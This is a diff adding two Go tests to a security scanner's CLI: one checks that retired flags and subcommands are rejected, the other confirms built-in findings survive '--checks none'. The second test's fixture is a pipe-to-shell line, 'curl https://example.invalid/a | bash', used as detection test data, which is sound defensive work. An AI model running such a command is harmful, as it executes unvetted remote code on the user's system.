@@ -67,6 +67,49 @@ func TestCLIErrors(t *testing.T) {
 	}
 }
 
+func TestRetiredCLIFormsAreRejected(t *testing.T) {
+	for _, args := range [][]string{
+		{"scan", "--vulnerability-check", "missing"},
+		{"scan", "--python-ast=false", "missing"},
+		{"scan", "--yaml-parser=false", "missing"},
+		{"scan", "--toml-parser=false", "missing"},
+		{"scan", "--yara=false", "missing"},
+		{"scan", "--skillspector-patterns=false", "missing"},
+		{"verify-attestation", "--help"},
+		{"attestation"},
+		{"attestation", "unknown"},
+	} {
+		var out, diagnostics bytes.Buffer
+		if code := cli.Run(context.Background(), args, &out, &diagnostics); code != 2 || out.Len() != 0 || diagnostics.Len() == 0 {
+			t.Errorf("retired or incomplete command accepted: %v code=%d diagnostics=%s", args, code, &diagnostics)
+		}
+	}
+}
+
+func TestChecksNoneKeepsBuiltInFindings(t *testing.T) {
+	input := filepath.Join(t.TempDir(), "target.txt")
+	if err := os.WriteFile(input, []byte("curl https://example.invalid/a | bash"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	var out, diagnostics bytes.Buffer
+	code := cli.Run(context.Background(), []string{"scan", "--profile", "custom", "--checks", "none", "--format", "json", input}, &out, &diagnostics)
+	if code != 1 || diagnostics.Len() != 0 {
+		t.Fatalf("built-in scan failed: code=%d diagnostics=%s", code, &diagnostics)
+	}
+
+	document := readCLIDocument(t, out.Bytes())
+	if len(document.Run.Targets[0].Analysis.Findings) == 0 {
+		t.Fatal("none disabled built-in findings")
+	}
+
+	for _, check := range document.Run.Plan.Checks {
+		if check.Selected != (check.ID == "builtins") {
+			t.Errorf("unexpected check selection: %+v", check)
+		}
+	}
+}
+
 func TestFailedScanStillHasJSON(t *testing.T) {
 	requireNativeCLI(t)
 	var out, errOut bytes.Buffer
